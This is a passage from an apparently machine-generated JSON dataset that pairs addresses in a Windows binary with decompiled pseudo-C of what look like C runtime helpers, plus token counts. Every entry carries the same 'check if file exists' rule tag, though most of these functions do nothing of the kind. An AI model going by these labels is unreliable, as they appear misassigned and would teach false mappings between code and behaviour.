        "decompiled_code": "\nint32_t fcn.0041389b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((*0x48e3b0 == -1) || (iVar2 = fcn.00415c4c(*0x48e3b0),  iVar2 == 0)) {\n        iVar2 = fcn.00415c8b(*0x48e3b0, 0xffffffff);\n        if (iVar2 != 0) {\n            iVar2 = fcn.004144bf(1, 0x364);\n            if (iVar2 == 0) {\n                fcn.00415c8b(*0x48e3b0, 0);\n            }\n            else {\n                iVar3 = fcn.00415c8b(*0x48e3b0, iVar2);\n                if (iVar3 != 0) {\n                    fcn.0041360e(iVar2, 0x48fae8);\n                    fcn.0041451c(0);\n                    return iVar2;\n                }\n                fcn.00415c8b(*0x48e3b0, 0);\n            }\n            fcn.0041451c(iVar2);\n        }\n    }\n    else if (iVar2 != -1) {\n        return iVar2;\n    }\n    fcn.0040fec9();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 332
    },
    "004139e2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004139e2(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffffd4;\n    \n    iVar3 = 0;\n    if ((*0x48e3b0 == -1) || (iVar1 = fcn.00415c4c(*0x48e3b0),  iVar1 == 0)) {\n        iVar1 = fcn.00415c8b(*0x48e3b0, 0xffffffff);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = fcn.004144bf(1, 0x364);\n        if (iVar1 == 0) {\n            fcn.00415c8b(*0x48e3b0, 0);\n            iVar1 = in_stack_ffffffd4;\n        }\n        else {\n            iVar2 = fcn.00415c8b(*0x48e3b0, iVar1);\n            if (iVar2 != 0) {\n                fcn.0041360e(iVar1, 0x48fae8);\n                fcn.0041451c(0);\n                goto code_r0x00413a76;\n            }\n            fcn.00415c8b(*0x48e3b0, 0);\n        }\n        fcn.0041451c(iVar1);\n    }\n    else {\n        if (iVar1 == -1) {\n            return 0;\n        }\ncode_r0x00413a76:\n        iVar3 = arg_ch * 0x364 + iVar1;\n    }\n    return iVar3;\n}\n",
        "token_count": 384
    },
    "0041565e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0041565e(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    uVar4 = 0;\n    do {\n        iVar3 = (uVar4 & 0x3f) * 0x38 + *((uVar4 >> 6) * 4 + 0x48fb00);\n        if ((*(iVar3 + 0x18) == -1) || (*(iVar3 + 0x18) == -2)) {\n            *(iVar3 + 0x28) = 0x81;\n            if (uVar4 == 0) {\n                uVar5 = 0xfffffff6;\n            }\n            else if (uVar4 == 1) {\n                uVar5 = 0xfffffff5;\n            }\n            else {\n                uVar5 = 0xfffffff4;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(uVar5);\n            if ((iVar1 != -1) && (iVar1 != 0)) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar1);\n                if (uVar2 != 0) {\n                    *(iVar3 + 0x18) = iVar1;\n                    if ((uVar2 & 0xff) == 2) {\n                        *(iVar3 + 0x28) = *(iVar3 + 0x28) | 0x40;\n                    }\n                    else if ((uVar2 & 0xff) == 3) {\n                        *(iVar3 + 0x28) = *(iVar3 + 0x28) | 8;\n                    }\n                    goto code_r0x00415700;\n                }\n            }\n            *(iVar3 + 0x28) = *(iVar3 + 0x28) | 0x40;\n            *(iVar3 + 0x18) = 0xfffffffe;\n            if (*0x48f970 != 0) {\n                *(*(*0x48f970 + uVar4 * 4) + 0x10) = 0xfffffffe;\n            }\n        }\n        else {\n            *(iVar3 + 0x28) = *(iVar3 + 0x28) | 0x80;\n        }\ncode_r0x00415700:\n        uVar4 = uVar4 + 1;\n        if (uVar4 == 3) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 556
    },
    "00415970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415970(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint var_4h;\n    \n    do {\n        if (arg_8h == arg_ch) {\n            return 0;\n        }\n        iVar2 = *arg_8h;\n        iVar3 = *(iVar2 * 4 + 0x48fd08);\n        if (iVar3 == 0) {\n            arg_8h_00 = *(iVar2 * 4 + 0x427cb0);\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg_8h_00, 0, 0x800);\n            if ((iVar3 != 0) ||\n               ((((iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 == 0x57 &&\n                  (iVar3 = fcn.00413468(arg_8h_00, L\"api-ms-\", 7),  iVar3 != 0)) &&\n                 (iVar3 = fcn.00413468(arg_8h_00, L\"ext-ms-\", 7),  iVar3 != 0)) &&\n                (iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg_8h_00, 0, 0),  iVar3 != 0)))) {\n                piVar1 = iVar2 * 4 + 0x48fd08;\n                iVar2 = *piVar1;\n                *piVar1 = iVar3;\n                if (iVar2 == 0) {\n                    return iVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                return iVar3;\n            }\n            *(iVar2 * 4 + 0x48fd08) = 0xffffffff;\n        }\n        else if (iVar3 != -1) {\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 462
    },
    "00415f24": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00415f24(uint32_t *arg_8h, ushort *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    if (arg_ch == NULL) {\n        if (arg_10h != 0) {\ncode_r0x00415f41:\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x16;\n            fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n            return 0x16;\n        }\n    }\n    else {\n        if (arg_10h == 0) goto code_r0x00415f41;\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    uVar2 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar2 = arg_18h;\n    }\n    if (0x7fffffff < uVar2) {\n        uVar3 = 0x16;\ncode_r0x00415fce:\n        *(arg_1ch + 0x18) = uVar3;\n        *(arg_1ch + 0x1c) = 1;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n        return uVar3;\n    }\n    iVar1 = fcn.00416004(arg_ch, arg_14h, uVar2, arg_1ch);\n    if (iVar1 == -1) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n        if (*(arg_1ch + 0x1c) == '\\0') {\n            return 0;\n        }\n        return *(arg_1ch + 0x18);\n    }\n    uVar2 = iVar1 + 1;\n    if (arg_ch != NULL) {\n        if (arg_10h < uVar2) {\n            if (arg_18h != 0xffffffff) {\n                *arg_ch = 0;\n                uVar3 = 0x22;\n                goto code_r0x00415fce;\n            }\n            uVar3 = 0x50;\n            uVar2 = arg_10h;\n        }\n        arg_ch[uVar2 - 1] = 0;\n    }\n    if (arg_8h == NULL) {\n        return uVar3;\n    }\n    *arg_8h = uVar2;\n    return uVar3;\n}\n",
        "token_count": 647
    },
    "0041620c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041620c(uint32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (arg_ch == NULL) {\n        if (arg_10h != 0) goto code_r0x0041622d;\n    }\n    else {\n        if (arg_10h == 0) {\ncode_r0x0041622d:\n            *(arg_1ch + 0x1c) = 1;\n            *(arg_1ch + 0x18) = 0x16;\n            fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n            return 0x16;\n        }\n        *arg_ch = 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    uVar2 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar2 = arg_18h;\n    }\n    if (0x7fffffff < uVar2) {\n        uVar3 = 0x16;\ncode_r0x004162b2:\n        *(arg_1ch + 0x18) = uVar3;\n        *(arg_1ch + 0x1c) = 1;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_1ch);\n        return uVar3;\n    }\n    iVar1 = fcn.004162ea(arg_ch, arg_14h, uVar2, arg_1ch);\n    if (iVar1 == -1) {\n        if (arg_ch != NULL) {\n            *arg_ch = 0;\n        }\n        if (*(arg_1ch + 0x1c) == '\\0') {\n            return 0;\n        }\n        return *(arg_1ch + 0x18);\n    }\n    uVar2 = iVar1 + 1;\n    if (arg_ch != NULL) {\n        if (arg_10h < uVar2) {\n            if (arg_18h != 0xffffffff) {\n                *arg_ch = 0;\n                uVar3 = 0x22;\n                goto code_r0x004162b2;\n            }\n            var_4h = 0x50;\n            uVar2 = arg_10h;\n        }\n        arg_ch[uVar2 - 1] = 0;\n    }\n    if (arg_8h == NULL) {\n        return var_4h;\n    }\n    *arg_8h = uVar2;\n    return var_4h;\n}\n",
        "token_count": 649
    },
    "004170ee": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004170ee(uint *arg_8h, uint32_t arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    int32_t var_68h;\n    uint hFile;\n    uint *var_60h;\n    uint *lpNumberOfBytesWritten;\n    uint var_58h;\n    uint *var_54h;\n    int32_t var_50h;\n    uint8_t *var_4ch;\n    uint8_t *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint *var_38h;\n    uint8_t var_31h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint lpBuffer;\n    uint var_20h;\n    uint var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x423786;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x48e22c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_44h = (arg_ch & 0x3f) * 0x38;\n    var_50h = arg_ch >> 6;\n    var_60h = arg_10h;\n    var_3ch = arg_18h;\n    hFile = *(*(var_50h * 4 + 0x48fb00) + 0x18 + var_44h);\n    var_54h = arg_14h + arg_10h;\n    var_70h = (*_sym.imp.KERNEL32.dll_GetConsoleOutputCP)(var_10h);\n    if (*(arg_18h + 0x14) == '\\0') {\n        fcn.0040d4a0();\n    }\n    var_68h = *(*(arg_18h + 0xc) + 8);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    var_30h = var_60h;\n    if (var_54h <= var_60h) {\ncode_r0x0041749f:\n        *in_FS_OFFSET = var_ch;\n        fcn.00406dcc(var_80h);\n        return;\n    }\n    iVar5 = 0;\n    var_48h = NULL;\n    iVar6 = var_44h;\ncode_r0x00417193:\n    var_31h = *var_30h;\n    var_40h = 0;\n    var_2ch = 1;\n    var_4ch = *(var_50h * 4 + 0x48fb00);\n    if (var_68h == 0xfde9) {\n        var_2ch = 0;\n        puVar3 = var_4ch + iVar6 + 0x2e;\n        do {\n            if (*puVar3 == 0) break;\n            var_2ch = var_2ch + 1;\n            puVar3 = puVar3 + 1;\n        } while (var_2ch < 5);\n        iVar6 = var_54h - var_30h;\n        if (var_2ch == 0) {\n            var_4ch = *(*var_30h + 0x48e4c8) + 1;\n            if (iVar6 < var_4ch) {\n                if (0 < iVar6) {\n                    do {\n                        *(*(var_50h * 4 + 0x48fb00) + var_44h + 0x2e + iVar5) = *(iVar5 + var_30h);\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < iVar6);\n                }\n                goto code_r0x00417450;\n            }\n            var_80h = 0;\n            var_7ch = 0;\n            var_2ch = (var_4ch == 0x4) + 1;\n            var_38h = var_30h;\n            iVar6 = fcn.004205a3(&var_40h, &var_38h, var_2ch, &var_80h, var_3ch);\n            if (iVar6 == -1) goto code_r0x0041749f;\n            puVar3 = var_30h + var_4ch;\n            iVar6 = var_44h;\n        }\n        else {\n            var_4ch = var_4ch + var_44h + 0x2e;\n            var_38h = *(*var_4ch + 0x48e4c8) + 1;\n            var_48h = var_38h - var_2ch;\n            if (iVar6 < var_48h) {\n                if (0 < iVar6) {\n                    do {\n                        puVar3 = iVar5 + var_30h;\n                        iVar4 = *(var_50h * 4 + 0x48fb00) + var_44h + iVar5;\n                        iVar5 = iVar5 + 1;\n                        *(iVar4 + 0x2e + var_2ch) = *puVar3;\n                    } while (iVar5 < iVar6);\n                }\ncode_r0x00417450:\n                arg_8h[1] = arg_8h[1] + iVar6;\n                goto code_r0x0041749f;\n            }\n            iVar6 = 0;\n            puVar3 = var_4ch;\n            do {\n                *(&var_18h + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n                puVar3 = puVar3 + 1;\n            } while (iVar6 < var_2ch);\n            if (0 < var_48h) {\n                fcn.00408060(&var_18h + var_2ch, var_30h, var_48h);\n            }\n            iVar6 = var_44h;\n            iVar4 = 0;\n            do {\n                *(*(var_50h * 4 + 0x48fb00) + var_44h + 0x2e + iVar4) = 0;\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < var_2ch);\n            var_6ch = &var_18h;\n            var_78h = 0;\n            var_74h = 0;\n            var_2ch = (var_38h == 0x4) + 1;\n            iVar4 = fcn.004205a3(&var_40h, &var_6ch, var_2ch, &var_78h, var_3ch);\n            if (iVar4 == -1) goto code_r0x0041749f;\n            puVar3 = var_30h + var_48h;\n        }\n        puVar1 = puVar3 + -1;\n    }\n    else {\n        if ((var_4ch[iVar6 + 0x2d] & 4) == 0) {\n            if (*(**(var_3ch + 0xc) + *var_30h * 2) < 0) {\n                var_38h = var_30h + 1;\n                if (var_38h < var_54h) {\n                    iVar4 = fcn.00415314(&var_40h, var_30h, 2, var_3ch);\n                    puVar1 = var_38h;\n                    if (iVar4 != -1) goto code_r0x00417375;\n                }\n                else {\n                    var_4ch[iVar6 + 0x2e] = *var_30h;\n                    puVar3 = *(var_50h * 4 + 0x48fb00) + 0x2d + iVar6;\n                    *puVar3 = *puVar3 | 4;\n                    arg_8h[1] = var_48h + 1;\n                }\n                goto code_r0x0041749f;\n            }\n            uVar2 = 1;\n            puVar1 = var_30h;\n        }\n        else {\n            var_20h._0_1_ = var_4ch[iVar6 + 0x2e];\n            var_20h._1_1_ = *var_30h;\n            var_4ch[iVar6 + 0x2d] = var_4ch[iVar6 + 0x2d] & 0xfb;\n            uVar2 = 2;\n            puVar1 = &var_20h;\n        }\n        iVar4 = fcn.00415314(&var_40h, puVar1, uVar2, var_3ch);\n        puVar1 = var_30h;\n        if (iVar4 == -1) goto code_r0x0041749f;\n    }\ncode_r0x00417375:\n    var_30h = puVar1 + 1;\n    var_38h = fcn.0041aa21(var_70h, 0, &var_40h, var_2ch, &lpBuffer, 5, 0, 0);\n    if (var_38h == NULL) goto code_r0x0041749f;\n    iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, &lpBuffer, var_38h, &lpNumberOfBytesWritten, 0);\n    if (iVar4 == 0) {\ncode_r0x00417497:\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *arg_8h = uVar2;\n        goto code_r0x0041749f;\n    }\n    var_48h = var_30h + (arg_8h[2] - var_60h);\n    arg_8h[1] = var_48h;\n    if (lpNumberOfBytesWritten < var_38h) goto code_r0x0041749f;\n    if (var_31h == 10) {\n        var_58h._0_2_ = 0xd;\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, &var_58h, 1, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) goto code_r0x00417497;\n        if (lpNumberOfBytesWritten == NULL) goto code_r0x0041749f;\n        arg_8h[2] = arg_8h[2] + 1;\n        arg_8h[1] = arg_8h[1] + 1;\n        var_48h = arg_8h[1];\n    }\n    if (var_54h <= var_30h) goto code_r0x0041749f;\n    goto code_r0x00417193;\n}\n",
        "token_count": 2550
    },
    "00417d33": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00417d33(uint8_t **arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *arg_ch;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.0040e0ee();\n        *puVar2 = 0x16;\n        fcn.0040b81f();\n    }\n    else if (((arg_8h[3] >> 0xd & 1) != 0) && ((arg_8h[3] >> 0xc & 1) == 0)) {\n        if ((arg_8h[3] >> 1 & 1) == 0) {\n            LOCK();\n            arg_8h[3] = arg_8h[3] | 1;\n            if ((arg_8h[3] & 0x4c0) == 0) {\n                fcn.004191a0(arg_8h);\n            }\n            *arg_8h = arg_8h[1];\n            puVar3 = arg_8h[6];\n            arg_ch = arg_8h[1];\n            arg_8h_00 = fcn.00415447(arg_8h);\n            puVar3 = fcn.00418a88(arg_8h_00, arg_ch, puVar3);\n            arg_8h[2] = puVar3;\n            puVar3 = arg_8h[2];\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((arg_8h[3] & 6) == 0) {\n                    iVar4 = fcn.00415447(arg_8h);\n                    if ((iVar4 == -1) || (iVar4 = fcn.00415447(arg_8h),  iVar4 == -2)) {\n                        iVar4 = 0x48e488;\n                    }\n                    else {\n                        iVar4 = fcn.00415447(arg_8h);\n                        uVar5 = fcn.00415447(arg_8h);\n                        iVar4 = *((iVar4 >> 6) * 4 + 0x48fb00) + (uVar5 & 0x3f) * 0x38;\n                    }\n                    if ((*(iVar4 + 0x28) & 0x82) == 0x82) {\n                        LOCK();\n                        arg_8h[3] = arg_8h[3] | 0x20;\n                    }\n                }\n                if (((arg_8h[6] == 0x200) && ((arg_8h[3] >> 6 & 1) != 0)) && ((arg_8h[3] & 0x100) == 0)) {\n                    arg_8h[6] = 0x1000;\n                }\n                arg_8h[2] = arg_8h[2] + -1;\n                uVar1 = **arg_8h;\n                *arg_8h = *arg_8h + 1;\n                return uVar1;\n            }\n            LOCK();\n            arg_8h[3] = arg_8h[3] | (puVar3 != NULL) * 8 + 8;\n            arg_8h[2] = NULL;\n        }\n        else {\n            LOCK();\n            arg_8h[3] = arg_8h[3] | 0x10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 807
    },
    "00418460": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00418460(uint arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t arg_10h_00;\n    uint32_t uVar5;\n    ulong uVar6;\n    \n    uVar1 = fcn.00415447(arg_ch);\n    if ((arg_ch[3] & 0xc0U) == 0) {\n        iVar4 = fcn.0041789c(uVar1, &arg_8h, 1, arg_10h);\n        uVar1 = -(iVar4 + -1) & 0xffffff00U | 1 - (iVar4 + -1 != 0);\n    }\n    else {\n        uVar5 = 0;\n        arg_10h_00 = *arg_ch - arg_ch[1];\n        *arg_ch = arg_ch[1] + 1;\n        arg_ch[2] = arg_ch[6] + -1;\n        if (arg_10h_00 < 1) {\n            if ((uVar1 == 0xffffffff) || (uVar1 == 0xfffffffe)) {\n                uVar2 = 0x48e488;\n            }\n            else {\n                uVar2 = (uVar1 & 0x3f) * 0x38 + *((uVar1 >> 6) * 4 + 0x48fb00);\n            }\n            if ((*(uVar2 + 0x28) & 0x20) != 0) {\n                uVar6 = fcn.004190e4(uVar1, 0, 0, 2);\n                uVar2 = uVar6 & uVar6 >> 0x20;\n                if (uVar2 == 0xffffffff) {\n                    puVar3 = arg_ch + 3;\n                    LOCK();\n                    *puVar3 = *puVar3 | 0x10;\n                    return CONCAT31(puVar3 >> 8, 1);\n                }\n            }\n        }\n        else {\n            uVar2 = fcn.0041789c(uVar1, arg_ch[1], arg_10h_00, arg_10h);\n            uVar5 = uVar2;\n        }\n        *arg_ch[1] = arg_8h;\n        uVar1 = uVar2 & 0xffffff00 | uVar5 == arg_10h_00;\n    }\n    return uVar1;\n}\n",
        "token_count": 566
    },
    "0041ae1a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ae1a(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uStack24;\n    int32_t var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0041ad85:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    var_4h = arg_14h;\n                    piVar3 = arg_8h;\n                    iVar4 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar3);\n                            *piVar3 = iVar1;\n                            piVar3 = piVar3 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar3);\n                            *piVar3 = iVar1;\n                            piVar3 = piVar3 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while ((iVar4 != 0) && (var_4h = var_4h + -1,  var_4h != 0));\n                        if (var_4h == 0) {\n                            *piVar3 = 0;\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.0040e0ee();\n                    uStack24 = 0x22;\n                    goto code_r0x0041ad72;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0041ad85;\n    puVar2 = fcn.0040e0ee();\n    uStack24 = 0x16;\ncode_r0x0041ad72:\n    *puVar2 = uStack24;\n    fcn.0040b81f();\n    return uStack24;\n}\n",
        "token_count": 648
    },
    "0041b131": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_298h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b131(char *arg_8h, char *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *arg_8h_00;\n    int32_t var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint32_t lpFileName;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint32_t var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    int32_t *var_25ch;\n    uint var_255h;\n    uint var_228h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    var_25ch = arg_10h;\n    if (arg_ch != arg_8h) {\n        do {\n            cVar1 = *arg_ch;\n            if (((cVar1 == '/') || (cVar1 == '\\\\')) || (cVar1 == ':')) break;\n            arg_ch = fcn.004218e0(arg_8h, arg_ch);\n        } while (arg_ch != arg_8h);\n    }\n    var_255h._0_1_ = *arg_ch;\n    if ((var_255h == ':') && (arg_ch != arg_8h + 1)) {\n        fcn.0041b080(arg_8h, 0, 0, var_25ch);\n    }\n    else {\n        if (((var_255h == '/') || (var_255h == '\\\\')) || (uVar2 = 0,  var_255h == ':')) {\n            uVar2 = 1;\n        }\n        var_28ch = 0;\n        var_288h = 0;\n        lpFileName = 0;\n        var_280h = 0;\n        var_27ch = 0;\n        var_278h._0_1_ = '\\0';\n        uVar3 = fcn.0041ac8a();\n        iVar4 = fcn.0041009d(arg_8h, &var_28ch, uVar3);\n        iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(~-(iVar4 != 0) & lpFileName, 0, &var_255h + 1, 0, 0, 0);\n        if (iVar4 == -1) {\n            fcn.0041b080(arg_8h, 0, 0, var_25ch);\n            if (var_278h != '\\0') {\n                fcn.0041451c(lpFileName);\n            }\n        }\n        else {\n            iVar5 = var_25ch[1] - *var_25ch >> 2;\n            do {\n                var_274h = 0;\n                var_270h = 0;\n                var_26ch = 0;\n                var_268h = 0;\n                var_264h = 0;\n                var_260h._0_1_ = '\\0';\n                uVar3 = fcn.0041ac8a();\n                iVar6 = fcn.0041ae3d(&var_228h, &var_274h, &var_255h, uVar3);\n                arg_8h_00 = ~-(iVar6 != 0) & var_26ch;\n                if (((*arg_8h_00 != '.') ||\n                    ((arg_8h_00[1] != '\\0' && ((arg_8h_00[1] != '.' || (arg_8h_00[2] != '\\0')))))) &&\n                   (var_298h = fcn.0041b080(arg_8h_00, arg_8h, -uVar2 & arg_ch + (1 - arg_8h), var_25ch),  var_298h != 0\n                   )) {\n                    if (var_260h != '\\0') {\n                        fcn.0041451c(var_26ch);\n                    }\n                    (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n                    if (var_278h != '\\0') {\n                        fcn.0041451c(lpFileName);\n                    }\n                    goto code_r0x0041b3a8;\n                }\n                if (var_260h != '\\0') {\n                    fcn.0041451c(var_26ch);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar4, &var_255h + 1);\n            } while (iVar6 != 0);\n            iVar6 = var_25ch[1] - *var_25ch >> 2;\n            if (iVar5 != iVar6) {\n                fcn.004213b0(*var_25ch + iVar5 * 4, iVar6 - iVar5, 4, fcn.0041ae25);\n            }\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar4);\n            if (var_278h != '\\0') {\n                fcn.0041451c(lpFileName);\n            }\n        }\n    }\ncode_r0x0041b3a8:\n    fcn.00406dcc(var_298h);\n    return;\n}\n",
        "token_count": 1252
    },
    "0041c3c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c3c0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x48fd00)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        iVar1 = *((arg_8h >> 6) * 4 + 0x48fb00);\n        if (((*(iVar3 + 0x28 + iVar1) & 1) != 0) && (*(iVar3 + 0x18 + iVar1) != -1)) {\n            iVar1 = fcn.00410641();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x0041c426;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, 0);\n            }\ncode_r0x0041c426:\n            *(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x48fb00)) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar2 = fcn.0040e0ee();\n    *puVar2 = 9;\n    puVar2 = fcn.0040e0db();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 400
    },
    "0041d0ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
